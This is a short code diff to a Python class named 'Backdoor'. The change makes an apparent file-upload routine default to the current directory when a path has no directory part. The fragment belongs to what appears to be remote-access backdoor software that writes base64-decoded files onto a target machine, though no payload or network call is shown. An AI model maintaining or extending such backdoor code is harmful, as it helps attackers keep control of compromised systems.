@@ -100,7 +100,7 @@ class Backdoor:
                 return "[-] Error: Decoded content is empty. Invalid base64 data."
             
             # Check if the directory exists, if not, return an error
-            directory = os.path.dirname(path)
+            directory = os.path.dirname(path) or "."
             if not os.path.exists(directory):
                 return f"[-] Error: Directory does not exist: {directory}"
 
